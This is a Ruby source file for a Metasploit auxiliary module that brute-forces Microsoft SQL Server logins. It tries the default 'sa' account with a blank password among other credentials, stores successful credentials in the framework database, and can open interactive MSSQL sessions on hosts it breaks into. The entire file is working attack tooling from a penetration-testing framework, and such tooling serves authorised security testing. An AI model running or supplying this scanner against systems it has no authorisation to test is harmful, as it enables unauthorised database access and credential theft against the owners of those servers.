##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mssql'
require 'rex/proto/mssql/client'
require 'rex/post/mssql'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name' => 'MSSQL Login Utility',
      'Description' => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
      'Author' => 'MC',
      'References' => [
        [ 'CVE', '1999-0506'] # Weak password
      ],
      'License' => MSF_LICENSE,
      # some overrides from authbrute since there is a default username and a blank password
      'DefaultOptions' => {
        'USERNAME' => 'sa',
        'BLANK_PASSWORDS' => true,
        'CreateSession' => false
      }
    )
    register_options([
      Opt::Proxies,
      OptBool.new('TDSENCRYPTION', [ true, 'Use TLS/SSL for TDS data "Force Encryption"', false]),
      OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
    ])

    if framework.features.enabled?(Msf::FeatureManager::MSSQL_SESSION_TYPE)
      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
    else
      options_to_deregister = %w[CreateSession]
    end
    deregister_options(*options_to_deregister)
  end

  def create_session?
    if framework.features.enabled?(Msf::FeatureManager::MSSQL_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def run
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::MSSQL_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} MSSQL #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open an MSSQL session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  def run_host(ip)
    print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")

    if datastore['TDSENCRYPTION']
      if create_session?
        raise Msf::OptionValidateError.new(
          {
            'TDSENCRYPTION' => "Cannot create sessions when encryption is enabled. See https://github.com/rapid7/metasploit-framework/issues/18745 to vote for this feature"
          }
        )
      else
        print_status("TDS Encryption enabled")
      end
    end

    cred_collection = build_credential_collection(
      realm: datastore['DOMAIN'],
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::MSSQL.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 30,
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        auth: datastore['Mssql::Auth'],
        domain_controller_rhost: datastore['DomainControllerRhost'],
        hostname: datastore['Mssql::Rhostname'],
        windows_authentication: datastore['USE_WINDOWS_AUTHENT'],
        tdsencryption: datastore['TDSENCRYPTION'],
        framework: framework,
        framework_module: self,
        use_client_as_proof: create_session?,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )
    )
    successful_logins = []
    successful_sessions = []
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        successful_logins << result

        if create_session?
          begin
            successful_sessions << session_setup(result)
          rescue ::StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
            result.connection.close unless result.connection.nil?
          end
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::MSSQL]
  def session_setup(result)
    return unless (result.connection && result.proof)

    my_session = Msf::Sessions::MSSQL.new(result.connection, { client: result.proof, **result.proof.detect_platform_and_arch })
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end
end
